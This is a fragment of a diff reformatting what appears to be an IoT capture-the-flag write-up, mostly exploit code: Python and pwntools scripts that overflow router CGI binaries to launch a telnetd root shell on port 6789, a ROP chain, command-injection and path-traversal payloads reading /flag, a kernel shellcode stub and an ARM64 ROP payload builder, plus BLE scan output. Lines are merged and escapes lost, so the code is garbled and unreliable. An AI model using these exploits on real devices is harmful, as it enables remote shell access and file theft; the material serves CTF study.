+url = "http://{}/cgi-bin/63.cgi".format(IP)uuid = ""for i in range(2, 6): r = requests.get( url=url, headers={"COOKIES": "uuid=%{}$x".format(str(i))} ) res = r.text.split('n')[0] uuid += binascii.unhexlify(res).decode()[::-1] print(uuid)
 url = "http://{}/cgi-bin/55.cgi".format(IP)payload = b"*#$^" + b"xff" * 3 + b"xff" * 3 payload = payload.ljust(0x2b0, b"B") payload += b'telnetd -p6789 -l/bin/sh;' payload = payload.ljust(0x5A8, b"C") payload += p32(0x000109DC) r = requests.post( url=url, headers={ "COOKIES": "uuid={}".format(uuid), "Content-Type": "application/x-www-form-urlencoded" }, data=payload)
 sleep(2)os.system("telnet {} 6789".format(IP))
-```
+#!/usr/bin/env python#-*- coding:
+utf-8 -*-# @Author : nocbtm
 
-
-
-```
-#!/usr/bin/env python#-*- coding:utf-8 -*-# @Author : nocbtm
-
-import osimport sysfrom pwn import *
-context(arch='arm', os='linux', endian='little', word_size=32)# context.log_level = 'debug'
+import osimport sys
+from pwn import *
+context(arch='arm', os='linux', endian='little', word_size=32)
+# context.log_level = 'debug'
 if len(sys.argv) < 3: print("[+] Example python exp.py ip port") exit(-1)
 IP = sys.argv[1]PORT = sys.argv[2]HOST = IP + ":" + str(PORT)command = "telnetd -p6789 -l/bin/sh"
 """func returnPOP {R4-R11,PC}"""
-# a 0x61# z 0x7a
+# a 0x61
+# z 0x7a
 
 binary_path = './www/cgi-bin/flc_cgi.cgi'libc_path = './lib/libc-2.13.so'
 libc = ELF(libc_path)
@@ -965,117 +1123,51 @@ buf2 += p32(command_addr+7) + p32(kong_addr) + p32(0x01010101)*2 + p32(strcpy_ad
 buf2 += p32(command_addr) + p32(0xbefffb74) + p32(0xbefffb74) + p32(command_addr)+ p32(0x90B4)action = 'action=command&command=network&{}=1'.format(buf2)
 
 payload = ''payload += 'GET /cgi-bin/flc_cgi.cgi?{} HTTP/1.1rn'.format(action)payload += 'Host: {}rn'.format(HOST)payload += 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0rn'payload += 'Content-Type: application/octet-streamrn'payload += 'X-Requested-With: XMLHttpRequestrn'payload += 'Referer: http://192.168.0.1/fm.htmlrn'payload += 'rn'
-while True: try: sleep(0.1) p = remote(IP, PORT) p.send(payload) content = p.recv() print(content) if 'HTTP' in content: try: p = remote(IP, 6789) if p: print("Attack Success") break except: p.close() pass
- except: p.close() pass
+while True: try: sleep(0.1) p = remote(IP, PORT) p.send(payload) content = p.recv() print(content) if 'HTTP' in content: try: p = remote(IP, 6789) if p: print("Attack Success") break 
+except: p.close() pass
+ 
+except: p.close() pass
 print("Now you can telnet {} 6789".format(IP))os.system("telnet {} 6789".format(IP))
-```
-
-
-
-```
-if(c[idx] == '-' || c[idx] == ';' || c[idx] == '|' || c[idx] == '`' || c[idx] == '&' || c[idx] == '$' || c[idx] == '!' || c[idx] == '(' || c[idx] == ')' || c[idx] == ''' || c[idx] == '"'){ SIM_SYSLOG_OP("Illegal input!");return -1;        }
-```
-
-
-
-```
+if(c[idx] == '-' || c[idx] == ';' || c[idx] == '|' || c[idx] == '`' || c[idx] == '&' || c[idx] == '$' || c[idx] == '!' || c[idx] == '(' || c[idx] == ')' || c[idx] == ''' || c[idx] == '"'){ SIM_SYSLOG_OP("Illegal input!");
+return -1;        }
 第一次：Acat /flag第二次：;
-```
-
-
-
-```
 tftp -p -l /tmp/logs.txt -r /tmp/logs.txt ;cat /flag
-```
-
-
-
-```
 # file thttpdthttpd: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.3, for GNU/Linux 3.2.0, BuildID[sha1]=30fc332f1e5780c1c7e72cbd9070ab0c767bf3cf, with debug_info, not stripped
-```
-
-
-
-```
-❯ ls -altotal 16drwxr-xr-x 1 iot iot 128 Mar 9 14:33 .drwxr-xr-x 1 iot iot 256 Mar 15 11:29 ..-rw-r--r-- 1 iot iot 19 Mar 9 14:33 .htpasswd-rw-r--r-- 1 iot iot 221 Mar 9 14:33 index.html❯ cat .htpasswd admin:tp2A/UzJN/Vr
-```
-
-
-
-```
+❯ ls -altotal 16drwxr-xr-x 1 iot iot 128 Mar 9 14:33 .drwxr-xr-x 1 iot iot 256 Mar 15 11:29 ..-rw-r--r-- 1 iot iot 19 Mar 9 14:33 .htpasswd-rw-r--r-- 1 iot iot 221 Mar 9 14:33 index.html❯ cat .htpasswd admin:
+tp2A/UzJN/Vr
 /* Returns -1 == unauthorized, 0 == no auth file, 1 = authorized. */
-```
-
-
-
-```
 Authorization: Basic $(var)
-```
-
-
-
-```
 Authorization: Basic -====
-```
-
-
-
-```
-#!/usr/bin/env python# encoding: utf-8from pwn import *import timecontext.log_level = 'debug'
-# for hc->origfilename in a specific location url = '/'+'a'*0xC8Accept = 'b'AcceptE = 'c'payload = ''payload += 'GET {} HTTP/1.1rn'.format(url)payload += 'Host: 127.0.0.1:80rn'payload += 'Accept: {}rn'.format(Accept)payload += 'Accept-Encoding: {}rnrn'.format(AcceptE)p = remote("20.21.2.27",80)p.send(payload)p.recv()
+#!/usr/bin/env python
+# encoding: utf-8
+from pwn import *import timecontext.log_level = 'debug'
+# for hc->origfilename in a specific location url = '/'+'a'*0xC8Accept = 'b'AcceptE = 'c'payload = ''payload += 'GET {} HTTP/1.1rn'.format(url)payload += 'Host: 127.0.0.1:
+80rn'payload += 'Accept: {}rn'.format(Accept)payload += 'Accept-Encoding: {}rnrn'.format(AcceptE)p = remote("20.21.2.27",80)p.send(payload)p.recv()
 # for &authpath chunk
-url = '/index.html'Accept = 'b'AcceptE = 'c'payload = ''payload += 'GET {} HTTP/1.1rn'.format(url)payload += 'Host: 127.0.0.1:80rn'payload += 'Accept: {}rn'.format(Accept)payload += 'Accept-Encoding: {}rnrn'.format(AcceptE)p = remote("20.21.2.27",80)p.send(payload)p.recv()
+url = '/index.html'Accept = 'b'AcceptE = 'c'payload = ''payload += 'GET {} HTTP/1.1rn'.format(url)payload += 'Host: 127.0.0.1:
+80rn'payload += 'Accept: {}rn'.format(Accept)payload += 'Accept-Encoding: {}rnrn'.format(AcceptE)p = remote("20.21.2.27",80)p.send(payload)p.recv()
 
-sleep(3)# for change hc->origfilenamep = remote("20.21.2.27",80)url = '/'Accept = 'b'AcceptE = 'c'*0x1468+'../../flag.txt'payload = ''payload += 'GET {} HTTP/1.1rn'.format(url)payload += 'Host: 127.0.0.1:80rn'payload += 'Authorization: Basic -====rn'payload += 'Accept: {}rn'.format(Accept)payload += 'Accept-Encoding: {}rnrn'.format(AcceptE)p.send(payload)p.recv()p.close()
-```
-
-
-
-```
+sleep(3)
+# for change hc->origfilenamep = remote("20.21.2.27",80)url = '/'Accept = 'b'AcceptE = 'c'*0x1468+'../../flag.txt'payload = ''payload += 'GET {} HTTP/1.1rn'.format(url)payload += 'Host: 127.0.0.1:
+80rn'payload += 'Authorization: Basic -====rn'payload += 'Accept: {}rn'.format(Accept)payload += 'Accept-Encoding: {}rnrn'.format(AcceptE)p.send(payload)p.recv()p.close()
 for(;;){if(!PD2){ F_CPU-=10000; }else{ F_CPU=F_CPU; }}
-```
-
-
-
-```
 data < -(k0, k1, k2...k6); r < -("_", ".")for i < - 0 to 6 MOSI_enc(r, data[i]) delay 350msend
-```
-
-
-
-```
 .－－/./.－－－－/－.－./－－－－－/－－/.
-```
-
-
-
-```
 def base64Decode(string): result = []string = string.strip("=") binstr = "" bin6list = [] bin8list = [] base64_list = "a0b1c2d3e4f5g6h7i8j9ZYXWVUTSRQPON+klmnopqrABCDEFGHIJKLM/stuvwxyz"
 for ch in string: bin6list.append("{:>06}".format(str(bin(base64_list.index(ch)).replace("0b", ""))))
  binstr = "".join(bin6list)
 for i in range(0, len(binstr), 8): bin8list.append(binstr[i:i + 8])
 for item in range(len(bin8list) - 1): result.append(chr(int(bin8list[item], 2)))return "".join(result)print(base64Decode("UoH+U/D/U92lgdLnWMZIR/nOVo2JU9VKOi=="))
-```
-
-
-
-```
-void sd_read_disk_check(struct scsi_disk *sdkp){struct scsi_sense_hdr sshdr;struct scsi_device *sdp = sdkp->device;unsigned char data_buffer[sdp->sector_size];unsigned char rdCmd[10] = {READ_10, 0, 0, 0, 0, 0, 0, 0, 0, 0};int i = 0;
+void sd_read_disk_check(struct scsi_disk *sdkp){struct scsi_sense_hdr sshdr;
+struct scsi_device *sdp = sdkp->device;
+unsigned char data_buffer[sdp->sector_size];
+unsigned char rdCmd[10] = {READ_10, 0, 0, 0, 0, 0, 0, 0, 0, 0};
+int i = 0;
 char cap_str_10[10]; string_get_size(sdkp->capacity, sdp->sector_size, STRING_UNITS_10, cap_str_10, sizeof(cap_str_10)); sd_printk(KERN_NOTICE, sdkp,"size:%x,%x,%sn", sdkp->capacity, sdp->sector_size, cap_str_10);
 if(sdkp->capacity*sdp->sector_size>10485760)return;
  rdCmd[2] = (unsigned char)((0 >> 24) & 0xff); rdCmd[3] = (unsigned char)((0 >> 16) & 0xff); rdCmd[4] = (unsigned char)((0 >> 8) & 0xff); rdCmd[5] = (unsigned char)(0 & 0xff); rdCmd[7] = (unsigned char)(((sdkp->capacity) >> 8) & 0xff); rdCmd[8] = (unsigned char)((sdkp->capacity) & 0xff);
 int the_result = scsi_execute_req(sdp, rdCmd, DMA_FROM_DEVICE, data_buffer,1024, &sshdr, SD_TIMEOUT, SD_MAX_RETRIES, NULL);if (the_result > 0) { sd_printk(KERN_NOTICE, sdkp,"readerrorn"); }else { sd_printk(KERN_NOTICE, sdkp,"readsuccessn"); }return 0;}
-```
-
-
-
-```
 rmmod g_ethermount none /sys/kernel/config -t configfsmkdir /sys/kernel/config/usb_gadget/g1cd /sys/kernel/config/usb_gadget/g1mkdir configs/c.1mkdir functions/mass_storage.usb0echo "/tmp/payload" > functions/mass_storage.usb0/lun.0/filemkdir strings/0x409mkdir configs/c.1/strings/0x409echo 0x1D6B > idVendorecho 0x0100 > idProductcd configs/c.1ln -s ../../functions/mass_storage.usb0/ .cd ../../echo "musb-hdrc.1.auto" > UDC
-```
-
-
-
-```
 typedef long unsigned int size_t;typedef long long __kernel_loff_t;typedef __kernel_loff_t loff_t;
 typedef void *(*FILP_OPEN)(const char *file);#define FILP_OPEN ((FILP_OPEN)0xffffff8008087a68)
 typedef size_t (*VFS_READ)(void *file, char *buf, size_t count);#define VFS_READ ((VFS_READ)0xffffff8008087ab4)
@@ -1084,64 +1176,66 @@ typedef void (*SET_FS_KERNEL_TIPS)(void);#define SET_FS_KERNEL_TIPS ((SET_FS_KER
 typedef void (*FSYNC_TIPS)(void *file);#define FSYNC_TIPS ((FSYNC_TIPS)0xffffff8008087af4)
 typedef int (*PRINTK)(const char *fmt, ...);#define PRINTK ((PRINTK)0xffffff800811b374)
 void _start(void){unsigned char buf_read[16];
-void *fp1;void *fp2;loff_t pos1, pos2; PRINTK("start successnn"); SET_FS_KERNEL_TIPS();
+void *fp1;
+void *fp2;loff_t pos1, pos2; PRINTK("start successnn"); SET_FS_KERNEL_TIPS();
  fp1 = FILP_OPEN("/dev/sda"); fp2 = FILP_OPEN("/flag");
- VFS_READ(fp2, buf_read, 16);int ret = VFS_WRITE(fp1, buf_read, 16); FSYNC_TIPS(fp1);}
-```
-
-
-
-```
-#define _GNU_SOURCE#include <stdio.h>#include <stdlib.h>#include <unistd.h>#include <arpa/inet.h>#include <string.h>
-#define ROP1 0xffffff80083e2e90#define ROP2 0xffffff800825fbe8#define ROP3 0xffffff80083e86fc#define memcpy_addr 0xffffff8008290e00#define buf_addr 0xffffff8000836000#define memcpy_num 0x500
+ VFS_READ(fp2, buf_read, 16);
+int ret = VFS_WRITE(fp1, buf_read, 16); FSYNC_TIPS(fp1);}
+    #define _GNU_SOURCE#include <stdio.h>#include <stdlib.h>#include #include <arpa/inet.h>#include <string.h>
+    #define ROP1 0xffffff80083e2e90#define ROP2 0xffffff800825fbe8#define ROP3 0xffffff80083e86fc#define memcpy_addr 0xffffff8008290e00#define buf_addr 0xffffff8000836000#define memcpy_num 0x500
 int main(){ FILE *fp1; FILE *fp2;
  fp1 = fopen("payload", "w+");if (!fp1)return -1;
-size_t rop[0x1000] = {0};int count = 0;memset(rop, 'a', 0x208); count += 0x208 / 8; rop[count++] = ROP1; rop[count++] = ROP2; rop[count++] = buf_addr; rop[count++] = ROP3;memset(rop + count, 'a', 0x48); count += 0x48 / 8; rop[count++] = memcpy_num; rop[count++] = memcpy_addr;memset(rop + count, 'a', 0x60); count += 0x60 / 8;
+size_t rop[0x1000] = {0};
+int count = 0;memset(rop, 'a', 0x208); count += 0x208 / 8; rop[count++] = ROP1; rop[count++] = ROP2; rop[count++] = buf_addr; rop[count++] = ROP3;memset(rop + count, 'a', 0x48); count += 0x48 / 8; rop[count++] = memcpy_num; rop[count++] = memcpy_addr;memset(rop + count, 'a', 0x60); count += 0x60 / 8;
  fp2 = fopen("shellcode.bin", "r");if (!fp2)return -1;
- fseek(fp2, 0, SEEK_END);int len = ftell(fp2); fseek(fp2, 0, SEEK_SET);size_t *buffer = malloc(len); len = fread(buffer, sizeof(char), len, fp2);memcpy(rop + count, buffer, len); count += len / 8 + 1;if (count < 1024 / 8 + 1) {memset(rop + count, 'a', 1024 / 8 + 1 - count); count += 1024 / 8 + 1 - count; }
- fwrite(rop, sizeof(size_t), count, fp1);free(buffer); fclose(fp1); fclose(fp2);return 0;}
-```
-
-
-
-```
+ fseek(fp2, 0, SEEK_END);
+int len = ftell(fp2); fseek(fp2, 0, SEEK_SET);
+size_t *buffer = malloc(len); len = fread(buffer, sizeof(char), len, fp2);memcpy(rop + count, buffer, len); count += len / 8 + 1;if (count < 1024 / 8 + 1) {memset(rop + count, 'a', 1024 / 8 + 1 - count); count += 1024 / 8 + 1 - count; }
+ fwrite(rop, sizeof(size_t), count, fp1);free(buffer); fclose(fp1); fclose(fp2);
+return 0;}
 $ sudo bluescan -m leAddr: 40:0F:CA:5A:C3:09 Addr type: random
-Connectable: TrueRSSI: -27 dBmGeneral Access Profile:Flags: LE General Discoverable ModeBR/EDR Not SupportedComplete Local Name: FlagInFlash
+Connectable: TrueRSSI: -27 dBmGeneral Access Profile:
+Flags: LE General Discoverable ModeBR/EDR Not SupportedComplete Local Name: FlagInFlash
 $ sudo bluescan -m gatt 40:0F:CA:5A:C3:09----------------GATT Scan Result----------------Number of services: 4
 
 Service (0x0001 - 0x0001, 0 characteristics)DeclarationHandle: 0x0001Type: 2800 (Primary Service declaration)Value: 1801 (Generic Attribute)Permissions: Read (no authen/author)
 Service (0x0002 - 0x0006, 2 characteristics)DeclarationHandle: 0x0002Type: 2800 (Primary Service declaration)Value: 1800 (Generic Access)Permissions: Read (no authen/author)
-Characteristic (0 descriptors)DeclarationHandle: 0x0003Type: 2803 (Characteristic declaration)Value:Properties: ReadHandle: 0x0004UUID: 2A00 (Device Name)Permissions: Read (no authen/author)
+Characteristic (0 descriptors)DeclarationHandle: 0x0003Type: 2803 (Characteristic declaration)Value:
+Properties: ReadHandle: 0x0004UUID: 2A00 (Device Name)Permissions: Read (no authen/author)
 Value declarationHandle: 0x0004Type: 2A00 (Device Name)Value: b'FlagInFlash'Permissions: Higher layer specific
-Characteristic (0 descriptors)DeclarationHandle: 0x0005Type: 2803 (Characteristic declaration)Value:Properties: ReadHandle: 0x0006UUID: 2A01 (Appearance)Permissions: Read (no authen/author)
+Characteristic (0 descriptors)DeclarationHandle: 0x0005Type: 2803 (Characteristic declaration)Value:
+Properties: ReadHandle: 0x0006UUID: 2A01 (Appearance)Permissions: Read (no authen/author)
 Value declarationHandle: 0x0006Type: 2A01 (Appearance)Value: b'x00x02'Permissions: Higher layer specific
 Service (0x0007 - 0x0009, 1 characteristics)DeclarationHandle: 0x0007Type: 2800 (Primary Service declaration)Value: AE5D1E47-5C13-43A0-FFFF-FFFFFFFFFFFF (Unknown)Permissions: Read (no authen/author)
-Characteristic (0 descriptors)DeclarationHandle: 0x0008Type: 2803 (Characteristic declaration)Value:Properties: ReadHandle: 0x0009UUID: 1111 (Unknown)Permissions: Read (no authen/author)
+Characteristic (0 descriptors)DeclarationHandle: 0x0008Type: 2803 (Characteristic declaration)Value:
+Properties: ReadHandle: 0x0009UUID: 1111 (Unknown)Permissions: Read (no authen/author)
 Value declarationHandle: 0x0009Type: 1111 (Unknown)Value: b'FFFFFF00CYW920819EVB-02'Permissions: Higher layer specific
 Service (0xff00 - 0xff05, 2 characteristics)DeclarationHandle: 0xff00Type: 2800 (Primary Service declaration)Value: AE5D1E47-5C13-43A0-8635-82AD38A1381F (Guess: WICED - OTA)Permissions: Read (no authen/author)
-Characteristic (1 descriptors)DeclarationHandle: 0xff01Type: 2803 (Characteristic declaration)Value:Properties: Indicate, Notify, WriteHandle: 0xff02UUID: A3DD50BF-F7A7-4E99-838E-570A086C661B (Guess: WICED - OTA Control Point)Permissions: Read (no authen/author)
+Characteristic (1 descriptors)DeclarationHandle: 0xff01Type: 2803 (Characteristic declaration)Value:
+Properties: Indicate, Notify, WriteHandle: 0xff02UUID: A3DD50BF-F7A7-4E99-838E-570A086C661B (Guess: WICED - OTA Control Point)Permissions: Read (no authen/author)
 DescriptorHandle: 0xff03Type: 2902 (Client Characteristic Configuration declaration)Value: b'x00x00'Permissions: Read (no authen/author), Write (higher layer specifies authen/author)
-Characteristic (0 descriptors)DeclarationHandle: 0xff04Type: 2803 (Characteristic declaration)Value:Properties: WriteHandle: 0xff05UUID: A2E86C7A-D961-4091-B74F-2409E72EFE26 (Guess: WICED - OTA Data)Permissions: Read (no authen/author)
-```
-
-
-
-```
+Characteristic (0 descriptors)DeclarationHandle: 0xff04Type: 2803 (Characteristic declaration)Value:
+Properties: WriteHandle: 0xff05UUID: A2E86C7A-D961-4091-B74F-2409E72EFE26 (Guess: WICED - OTA Data)Permissions: Read (no authen/author)
 $ sudo bluescan -m gatt----------------GATT Scan Result----------------Number of services: 4
 
 Service (0x0001 - 0x0001, 0 characteristics)DeclarationHandle: 0x0001Type: 2800 (Primary Service declaration)Value: 1801 (Generic Attribute)Permissions: Read (no authen/author)
 Service (0x0002 - 0x0006, 2 characteristics)DeclarationHandle: 0x0002Type: 2800 (Primary Service declaration)Value: 1800 (Generic Access)Permissions: Read (no authen/author)
-Characteristic (0 descriptors)DeclarationHandle: 0x0003Type: 2803 (Characteristic declaration)Value:Properties: ReadHandle: 0x0004UUID: 2A00 (Device Name)Permissions: Read (no authen/author)
+Characteristic (0 descriptors)DeclarationHandle: 0x0003Type: 2803 (Characteristic declaration)Value:
+Properties: ReadHandle: 0x0004UUID: 2A00 (Device Name)Permissions: Read (no authen/author)
 Value declarationHandle: 0x0004Type: 2A00 (Device Name)Value: b'FlagInFlash-Writeup'Permissions: Higher layer specific
-Characteristic (0 descriptors)DeclarationHandle: 0x0005Type: 2803 (Characteristic declaration)Value:Properties: ReadHandle: 0x0006UUID: 2A01 (Appearance)Permissions: Read (no authen/author)
+Characteristic (0 descriptors)DeclarationHandle: 0x0005Type: 2803 (Characteristic declaration)Value:
+Properties: ReadHandle: 0x0006UUID: 2A01 (Appearance)Permissions: Read (no authen/author)
 Value declarationHandle: 0x0006Type: 2A01 (Appearance)Value: b'x00x02'Permissions: Higher layer specific
 Service (0x0007 - 0x0009, 1 characteristics)DeclarationHandle: 0x0007Type: 2800 (Primary Service declaration)Value: AE5D1E47-5C13-43A0-FFFF-FFFFFFFFFFFF (Unknown)Permissions: Read (no authen/author)
-Characteristic (0 descriptors)DeclarationHandle: 0x0008Type: 2803 (Characteristic declaration)Value:Properties: ReadHandle: 0x0009UUID: 1111 (Unknown)Permissions: Read (no authen/author)
+Characteristic (0 descriptors)DeclarationHandle: 0x0008Type: 2803 (Characteristic declaration)Value:
+Properties: ReadHandle: 0x0009UUID: 1111 (Unknown)Permissions: Read (no authen/author)
 Value declarationHandle: 0x0009Type: 1111 (Unknown)Value: b'flag{sEcvRe_yOur_oTA!}'Permissions: Higher layer specific
 Service (0xff00 - 0xff05, 2 characteristics)DeclarationHandle: 0xff00Type: 2800 (Primary Service declaration)Value: AE5D1E47-5C13-43A0-8635-82AD38A1381F (Guess: WICED - OTA)Permissions: Read (no authen/author)
-Characteristic (1 descriptors)DeclarationHandle: 0xff01Type: 2803 (Characteristic declaration)Value:Properties: Indicate, Notify, WriteHandle: 0xff02UUID: A3DD50BF-F7A7-4E99-838E-570A086C661B (Guess: WICED - OTA Control Point)Permissions: Read (no authen/author)
+Characteristic (1 descriptors)DeclarationHandle: 0xff01Type: 2803 (Characteristic declaration)Value:
+Properties: Indicate, Notify, WriteHandle: 0xff02UUID: A3DD50BF-F7A7-4E99-838E-570A086C661B (Guess: WICED - OTA Control Point)Permissions: Read (no authen/author)
 DescriptorHandle: 0xff03Type: 2902 (Client Characteristic Configuration declaration)Value: b'x00x00'Permissions: Read (no authen/author), Write (higher layer specifies authen/author)
-Characteristic (0 descriptors)DeclarationHandle: 0xff04Type: 2803 (Characteristic declaration)Value:Properties: WriteHandle: 0xff05UUID: A2E86C7A-D961-4091-B74F-2409E72EFE26 (Guess: WICED - OTA Data)        Permissions: Read (no authen/author)
+Characteristic (0 descriptors)DeclarationHandle: 0xff04Type: 2803 (Characteristic declaration)Value:
+Properties: WriteHandle: 0xff05UUID: A2E86C7A-D961-4091-B74F-2409E72EFE26 (Guess: WICED - OTA Data)        Permissions: Read (no authen/author)
 ```
 
 
